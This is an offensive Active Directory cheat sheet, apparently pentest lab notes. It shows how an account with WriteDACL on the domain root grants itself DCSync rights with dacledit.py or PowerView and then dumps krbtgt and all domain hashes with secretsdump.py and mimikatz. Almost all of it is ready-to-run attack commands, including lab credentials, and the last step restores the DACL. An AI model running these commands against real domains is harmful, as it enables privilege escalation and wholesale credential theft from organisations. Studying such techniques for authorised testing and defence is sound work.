# 10.04 DCSync Grant via dacledit WriteDACL on Domain

> WriteDACL on the domain root NC — grant yourself `DS-Replication-Get-Changes-All` via `dacledit.py`, then DCSync.

## Overview

WriteDACL on the domain root NC allows a controlled account to grant itself DS-Replication-Get-Changes and DS-Replication-Get-Changes-All, enabling a full DCSync attack. Verify with dacledit.py using -target-dn. After adding DCSync ACEs, run secretsdump.py; perform DCSync from Windows with mimikatz. Always restore the DACL using the auto-generated .bak file.

## Steps

- Enumerate WriteDACL with PowerView: Get-DomainSID | Get-DomainObjectAcl -ResolveGUIDs filtered to luna's SID.
- Confirm with dacledit.py -principal luna -target-dn dc=<DOMAIN>,dc=local.
- Verify DCSync fails before modification with secretsdump.py -just-dc-user krbtgt.
- Grant DCSync: dacledit.py -action write -rights DCSync — tool auto-creates a .bak backup file.
- Re-query DACL to confirm DS-Replication-Get-Changes and DS-Replication-Get-Changes-All ACEs were added.
- Run secretsdump.py again to dump krbtgt and all domain hashes.
- From Windows: Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -Rights DCSync; then mimikatz lsadump::dcsync.
- Restore the DACL using dacledit.py -action restore -file <backup>.

## Commands

### PowerView — enumerate WriteDACL on domain

```powershell
$userSID = ConvertTo-SID luna
```

### dacledit.py — read domain DACL

```bash
python3 examples/dacledit.py -principal luna -target-dn dc=<DOMAIN>,dc=local -dc-ip <TARGET> <DOMAIN>.local/luna:Moon123
```

### Attempt DCSync before modification

```bash
secretsdump.py -just-dc-user krbtgt <DOMAIN>.local/luna:Moon123@<TARGET>
```

### Grant DCSync rights

```bash
python3 examples/dacledit.py -principal luna -target-dn dc=<DOMAIN>,dc=local -dc-ip <TARGET> <DOMAIN>.local/luna:Moon123 -action write -rights DCSync
```

### DCSync after modification

```bash
secretsdump.py -just-dc-user krbtgt <DOMAIN>.local/luna:Moon123@<TARGET>
```

### Add-DomainObjectAcl (Windows PowerView)

```powershell
Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity luna -Rights DCSync -Verbose
```

### DCSync from Windows with mimikatz

```text
C:\Tools> mimikatz.exe "lsadump::dcsync /domain:<DOMAIN>.local /user:krbtgt /csv"
```

### Restore DACL from backup

```bash
python3 examples/dacledit.py -principal luna -target-dn dc=<DOMAIN>,dc=local -dc-ip <TARGET> <DOMAIN>.local/luna:Moon123 -action restore -file dacledit-20230524-211441.bak
```
